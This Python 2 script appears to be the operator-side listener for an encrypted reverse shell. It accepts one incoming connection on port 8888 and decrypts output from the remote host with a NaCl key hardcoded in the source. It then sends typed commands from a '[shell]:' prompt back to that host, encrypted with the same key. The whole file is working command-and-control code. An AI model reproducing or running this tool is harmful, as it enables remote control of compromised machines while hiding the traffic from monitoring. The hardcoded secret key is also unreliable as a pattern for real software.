#!/usr/bin/python2.7
import socket,os
import sys
import nacl.secret
import nacl.utils

HOST = '0.0.0.0'   # Symbolic name, meaning all available interfaces
PORT = 8888 # Arbitrary non-privileged port

# This must be kept secret, this is the combination to your safe
key = '9SeT2kaxYlRYS675TxzHwB2el4Pa15A3'

# This is your safe, you can use it to encrypt or decrypt messages
box = nacl.secret.SecretBox(key)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'Socket created'

#Bind socket to local host and port
try:
    s.bind((HOST, PORT))
except socket.error as msg:
    print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()

print 'Socket bind complete'

#Start listening on socket
s.listen(10)
print 'Socket now listening'
conn, addr = s.accept()
print 'Connected with ' + addr[0] + ':' + str(addr[1])

#now keep talking with the client
while 1:
    # receive encrypted data
    data = conn.recv(1024)
    # decrypt the data
    datadec = box.decrypt(data)
    #print the output
    print datadec
    #get next command
    nextcmd = raw_input("[shell]: ")
    #encrypt the input
    nextcmdEnc = box.encrypt(nextcmd)
    #send dat sh!t
    conn.send(nextcmdEnc)
